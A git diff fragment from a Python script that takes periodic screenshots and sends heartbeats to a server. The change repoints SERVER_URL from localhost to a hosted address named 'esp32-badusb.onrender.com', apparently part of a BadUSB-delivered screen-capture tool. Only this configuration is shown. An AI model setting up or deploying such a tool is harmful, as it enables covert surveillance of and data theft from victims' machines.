@@ -13,7 +13,7 @@ except ImportError:
     from PIL import ImageGrab
 
 # Configuration
-SERVER_URL = "http://localhost:3000" # Change this to your deployed Render URL later
+SERVER_URL = "https://esp32-badusb.onrender.com/" # Change this to your deployed Render URL later
 HEARTBEAT_INTERVAL = 1.0 # seconds
 SCREENSHOT_INTERVAL = 2.0 # seconds
 
